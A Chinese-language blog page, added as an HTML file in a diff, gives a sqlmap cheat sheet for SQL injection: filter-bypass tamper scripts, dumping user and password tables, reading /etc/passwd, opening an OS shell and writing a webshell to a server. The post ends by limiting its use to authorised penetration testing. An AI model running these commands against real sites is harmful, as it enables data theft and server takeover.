@@ -1,0 +1,833 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://img.icons8.com/ios-filled/50/github.png">
+  <link rel="icon" href="https://img.icons8.com/ios-filled/50/github.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Ninja">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="1️⃣ 常用命令1python sqlmap.py --random-agent --batch --level&#x3D;2 --tamper&#x3D;randomcase -u &lt;url&gt;   2️⃣ 进阶使用123456789101112131415161718192021222324# 指定注入点参数python sqlmap.py -r &quot;request.txt&quot; -p &amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqlmap SQL注入工具的使用方法">
+<meta property="og:url" content="http://example.com/2024/07/01/sqlmap%20SQL%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/index.html">
+<meta property="og:site_name" content="Ninja&#39;s blog - 学与用">
+<meta property="og:description" content="1️⃣ 常用命令1python sqlmap.py --random-agent --batch --level&#x3D;2 --tamper&#x3D;randomcase -u &lt;url&gt;   2️⃣ 进阶使用123456789101112131415161718192021222324# 指定注入点参数python sqlmap.py -r &quot;request.txt&quot; -p &amp;">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-07-01T09:13:20.330Z">
+<meta property="article:modified_time" content="2025-07-13T16:10:06.549Z">
+<meta property="article:author" content="Ninja">
+<meta property="article:tag" content="sqlmap">
+<meta property="article:tag" content="SQL注入">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>sqlmap SQL注入工具的使用方法 - Ninja&#39;s blog - 学与用</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":2},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Ninja&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-codeforces"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="https://hack.chat" target="_self">
+                    
+                    <span>Hack.chat私密聊天频道</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="https://git.io/linux" target="_self">
+                    
+                    <span>Linux命令大全</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="https://xssaq.com" target="_self">
+                    
+                    <span>XSS平台</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="sqlmap SQL注入工具的使用方法"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-07-01 17:13" pubdate>
+          2024年7月1日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          786 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          7 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">sqlmap SQL注入工具的使用方法</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2025年7月14日 凌晨
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="1️⃣-常用命令"><a href="#1️⃣-常用命令" class="headerlink" title="1️⃣ 常用命令"></a>1️⃣ 常用命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python sqlmap.py --random-agent --batch --level=2 --tamper=randomcase -u &lt;url&gt;<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="2️⃣-进阶使用"><a href="#2️⃣-进阶使用" class="headerlink" title="2️⃣ 进阶使用"></a>2️⃣ 进阶使用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 指定注入点参数</span><br>python sqlmap.py -r <span class="hljs-string">&quot;request.txt&quot;</span> -p <span class="hljs-string">&quot;id&quot;</span><br><br><span class="hljs-comment"># 延时注入</span><br>python sqlmap.py -r r.txt --technique=T<br><br><span class="hljs-comment"># 自动爬行目标网站，同时使用表单注入</span><br>python sqlmap.py -u &lt;url&gt; --crawl=1<br>python sqlmap.py -u &lt;url&gt; --forms --crawl=2<br>python sqlmap.py -u &lt;url&gt; --forms --crawl=all<br><br><span class="hljs-comment"># POST注入</span><br>python sqlmap.py -u &lt;url&gt; --data=<span class="hljs-string">&quot;username=admin&amp;password=123456&quot;</span><br>python sqlmap.py -u &lt;url&gt; --data=<span class="hljs-string">&quot;username=admin&amp;password=123456&quot;</span> -p <span class="hljs-string">&quot;username&quot;</span><br>python sqlmap.py -u &lt;url&gt; --data=<span class="hljs-string">&quot;username=admin&amp;password=123456&quot;</span> --method=POST<br><br><span class="hljs-comment"># 使用代理</span><br>python sqlmap.py -u &lt;url&gt; --batch --level=5 --risk=3 --proxy=<span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span><br><br><span class="hljs-comment"># 伪静态注入</span><br>python sqlmap.py -u <span class="hljs-string">&quot;http://example.com/news/1.html&quot;</span> --batch --level=5 --risk=3<br><br><span class="hljs-comment"># 指定数据库类型</span><br>python sqlmap.py -u &lt;url&gt; --dbms=mysql<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="3️⃣-延时注入"><a href="#3️⃣-延时注入" class="headerlink" title="3️⃣ 延时注入"></a>3️⃣ 延时注入</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用时间延迟注入，每个注入请求后等待 5 秒</span><br>python sqlmap.py -u &lt;url&gt; --delay=5<br><br><span class="hljs-comment"># 时间延迟注入 + 布尔盲注</span><br>python sqlmap.py -u &lt;url&gt; --delay=5 --technique=T --time-sec=5<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="4️⃣-绕过组合示例"><a href="#4️⃣-绕过组合示例" class="headerlink" title="4️⃣ 绕过组合示例"></a>4️⃣ 绕过组合示例</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 绕过空格</span><br>python sqlmap.py -u &lt;url&gt; --tamper=space2comment,space2plus<br><br><span class="hljs-comment"># 绕过引号</span><br>python sqlmap.py -u &lt;url&gt; --tamper=apostrophemask,apostrophenullencode,doublequotemask,doublequotenullencode<br><br><span class="hljs-comment"># 绕过关键字</span><br>python sqlmap.py -u &lt;url&gt; --tamper=randomcase,space2morehash<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="5️⃣-常用参数"><a href="#5️⃣-常用参数" class="headerlink" title="5️⃣ 常用参数"></a>5️⃣ 常用参数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 获取数据库、表、字段、数据</span><br>--dbs                  <span class="hljs-comment"># 获取所有数据库</span><br>-D <span class="hljs-string">&quot;blog&quot;</span> --tables     <span class="hljs-comment"># 获取指定数据库下所有表</span><br>-D <span class="hljs-string">&quot;blog&quot;</span> -T <span class="hljs-string">&quot;admin&quot;</span> --columns   <span class="hljs-comment"># 获取指定表的字段</span><br>-D <span class="hljs-string">&quot;blog&quot;</span> -T <span class="hljs-string">&quot;admin&quot;</span> -C <span class="hljs-string">&quot;username,password&quot;</span> --dump  <span class="hljs-comment"># 导出字段内容</span><br><br><span class="hljs-comment"># 当前信息</span><br>--current-db           <span class="hljs-comment"># 当前数据库</span><br>--current-user         <span class="hljs-comment"># 当前用户</span><br>--<span class="hljs-built_in">users</span>                <span class="hljs-comment"># 所有用户</span><br>--passwords            <span class="hljs-comment"># 所有用户密码</span><br>--is-dba               <span class="hljs-comment"># 是否为管理员</span><br><br><span class="hljs-comment"># 爆破辅助</span><br>--common-tables        <span class="hljs-comment"># 常见表名爆破</span><br>--common-columns       <span class="hljs-comment"># 常见字段爆破</span><br><br><span class="hljs-comment"># 其他</span><br>--threads 10           <span class="hljs-comment"># 多线程</span><br>--batch                <span class="hljs-comment"># 跳过交互提示</span><br>--random-agent         <span class="hljs-comment"># 随机 User-Agent</span><br>--flush-session        <span class="hljs-comment"># 清空 session 重新扫描</span><br>--fresh-queries        <span class="hljs-comment"># 忽略 session 缓存</span><br>--eta                  <span class="hljs-comment"># 显示预计完成时间</span><br><br><span class="hljs-comment"># 执行系统命令</span><br>--os-cmd=<span class="hljs-built_in">whoami</span><br>--os-shell<br><br><span class="hljs-comment"># 风险等级</span><br>--risk=0|1|2|3<br><span class="hljs-comment"># 检测深度</span><br>--level=1|2|3|4|5<br><br><span class="hljs-comment"># 指定注入技术</span><br>--technique=BEUSTQ<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="6️⃣-高级功能"><a href="#6️⃣-高级功能" class="headerlink" title="6️⃣ 高级功能"></a>6️⃣ 高级功能</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 读取文件</span><br>--file-read=/etc/passwd<br><br><span class="hljs-comment"># 写入 WebShell</span><br>--file-write <span class="hljs-string">&quot;D:\\Tools\\Behinder\\shell.php&quot;</span> --file-dest <span class="hljs-string">&quot;G://www//shell.php&quot;</span><br><br><span class="hljs-comment"># 执行指定 SQL</span><br>--sql-query=<span class="hljs-string">&quot;&lt;SQL_query&gt;&quot;</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="7️⃣-支持的数据库"><a href="#7️⃣-支持的数据库" class="headerlink" title="7️⃣ 支持的数据库"></a>7️⃣ 支持的数据库</h2><table>
+<thead>
+<tr>
+<th>数据库</th>
+<th>参数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MySQL</td>
+<td><code>--dbms=mysql</code></td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>--dbms=postgresql</code></td>
+</tr>
+<tr>
+<td>MSSQL</td>
+<td><code>--dbms=mssql</code></td>
+</tr>
+<tr>
+<td>Microsoft Access</td>
+<td><code>--dbms=mdb</code></td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td><code>--dbms=oracle</code></td>
+</tr>
+<tr>
+<td>SQLite</td>
+<td><code>--dbms=sqlite</code></td>
+</tr>
+<tr>
+<td>Sybase</td>
+<td><code>--dbms=sybase</code></td>
+</tr>
+<tr>
+<td>Firebird</td>
+<td><code>--dbms=firebird</code></td>
+</tr>
+<tr>
+<td>Informix</td>
+<td><code>--dbms=informix</code></td>
+</tr>
+<tr>
+<td>MaxDB</td>
+<td><code>--dbms=maxdb</code></td>
+</tr>
+<tr>
+<td>DB2</td>
+<td><code>--dbms=db2</code></td>
+</tr>
+<tr>
+<td>HSQLDB</td>
+<td><code>--dbms=hsqldb</code></td>
+</tr>
+<tr>
+<td>MonetDB</td>
+<td><code>--dbms=monetdb</code></td>
+</tr>
+<tr>
+<td>Teradata</td>
+<td><code>--dbms=teradata</code></td>
+</tr>
+<tr>
+<td>MariaDB</td>
+<td><code>--dbms=mariadb</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="8️⃣-常用-tamper-脚本"><a href="#8️⃣-常用-tamper-脚本" class="headerlink" title="8️⃣ 常用 tamper 脚本"></a>8️⃣ 常用 <code>tamper</code> 脚本</h2><blockquote>
+<p><code>tamper</code> 是 sqlmap 的强大绕过功能。</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>脚本</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>randomcase.py</td>
+<td>随机大小写</td>
+</tr>
+<tr>
+<td>space2comment.py</td>
+<td>空格替换为 <code>/**/</code></td>
+</tr>
+<tr>
+<td>space2plus.py</td>
+<td>空格替换为 <code>+</code></td>
+</tr>
+<tr>
+<td>randomcomments.py</td>
+<td>SQL 关键字注释分割</td>
+</tr>
+<tr>
+<td>versionedkeywords.py</td>
+<td>使用内联注释绕过</td>
+</tr>
+<tr>
+<td>apostrophemask.py</td>
+<td>引号 UTF-8 编码</td>
+</tr>
+<tr>
+<td>base64encode.py</td>
+<td>Base64 编码</td>
+</tr>
+<tr>
+<td>space2morehash.py</td>
+<td>空格替换为 <code>#</code> 并换行</td>
+</tr>
+<tr>
+<td>apostrophenullencode.py</td>
+<td>单引号用双字节 Unicode 替换</td>
+</tr>
+<tr>
+<td>charencode.py</td>
+<td>URL 编码</td>
+</tr>
+<tr>
+<td>chardoubleencode.py</td>
+<td>双重 URL 编码</td>
+</tr>
+<tr>
+<td>modsecurityversioned.py</td>
+<td>MySQL 内联注释绕过</td>
+</tr>
+<tr>
+<td>unionalltounion.py</td>
+<td><code>UNION ALL SELECT</code> 转 <code>UNION SELECT</code></td>
+</tr>
+<tr>
+<td>bluecoat.py</td>
+<td>用 <code>LIKE</code> 替代 <code>=</code></td>
+</tr>
+<tr>
+<td>sp_password.py</td>
+<td>拼接 <code>sp_password</code> 绕过</td>
+</tr>
+<tr>
+<td>…</td>
+<td>还有很多，可参考 sqlmap 自带文档</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="📌-小结"><a href="#📌-小结" class="headerlink" title="📌 小结"></a>📌 小结</h2><ul>
+<li>生产使用时建议先用低 <code>risk</code>、低 <code>level</code> 探测。</li>
+<li>多配合 <code>tamper</code> 组合测试。</li>
+<li>强烈建议配合 Burp Suite 抓包后使用 <code>-r</code> 参数。</li>
+<li>遵守法律法规，仅用于授权渗透测试。</li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/sqlmap/" class="print-no-link">#sqlmap</a>
+      
+        <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" class="print-no-link">#SQL注入</a>
+      
+    </div>
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/07/01/%E5%88%B6%E4%BD%9C%20winRAR%20%E5%90%8E%E9%97%A8/" title="制作 WinRAR 后门小技巧">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">制作 WinRAR 后门小技巧</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/07/01/%E4%BD%BF%E7%94%A8%20python%20%E7%BC%96%E5%86%99%E7%9A%84URL%E9%87%87%E9%9B%86%E5%B7%A5%E5%85%B7/" title="python编写的URL采集工具">
+                        <span class="hidden-mobile">python编写的URL采集工具</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
